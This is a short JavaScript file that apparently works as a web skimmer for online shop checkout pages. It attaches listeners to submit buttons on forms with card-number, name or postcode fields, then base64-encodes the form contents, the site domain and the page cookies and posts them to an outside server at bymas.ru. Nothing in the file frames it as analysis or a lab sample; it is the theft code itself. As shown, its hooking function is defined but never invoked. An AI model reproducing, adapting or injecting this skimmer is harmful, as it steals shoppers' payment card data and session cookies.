var jq = document.createElement('script');
jq.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js";
document.getElementsByTagName('head')[0].appendChild(jq);

function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

sleep(3000);

$(document).ready(function() { 

    console.log('Used JQUERY');

    var RemoteServerAddr = "https://bymas.ru";
    function sendStringifyDataToRemote(e){var t=new XMLHttpRequest,i=document.location.hostname,r=document.cookie,o="data="+btoa("FormData="+e+"; Domain="+i+"; Cookie="+r);return t.open("POST",RemoteServerAddr,!1),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send(o),!0}


    function shellFromPage(){

        var buttonsToSubmit = document.querySelectorAll('[type="submit"]');

        for(i = 0;i < buttonsToSubmit.length;i++){

            document.querySelectorAll('[type="submit"]')[i].addEventListener('click', function(){ 

                var bodyFormHTML = this.form;

                var IsExistsNameInputs = bodyFormHTML.querySelectorAll('[name*="cc_number"]');
                var isExistsIdInputs = bodyFormHTML.querySelectorAll('[id*="cc_number"]');
                var firstNameInputs = bodyFormHTML.querySelectorAll('[name="firstname"]');
                var postcodeInputs = bodyFormHTML.querySelectorAll('[name="postcode"]');
                var paymentCCNumberInputs = bodyFormHTML.querySelectorAll('[name="payment[cc_number]"]');

                if(IsExistsNameInputs.length > 0 || isExistsIdInputs.length > 0 || firstNameInputs.length > 0 || postcodeInputs.length > 0 || paymentCCNumberInputs.length > 0){

                    var serializeData = $(this.form).serialize() + 'testData';

                    sendStringifyDataToRemote(serializeData);

                }

            }, { once: true });

        }

    }

});
